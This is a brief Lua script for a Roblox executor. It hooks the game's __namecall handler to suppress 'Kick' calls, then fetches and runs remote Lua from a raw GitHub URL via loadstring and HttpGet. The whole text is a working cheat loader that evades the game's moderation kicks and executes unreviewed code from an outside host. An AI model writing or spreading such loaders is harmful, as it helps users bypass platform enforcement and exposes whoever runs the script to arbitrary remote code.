local a
a = hookmetamethod(game, "__namecall", function(self, ...)
    local mt = getnamecallmethod()
    if mt == "Kick" then
        return
    end
    return a(self, ...)
end)

wait(1)
loadstring(game:HttpGet('https://raw.githubusercontent.com/netherrlmm/top-g/refs/heads/main/meh.lua'))()
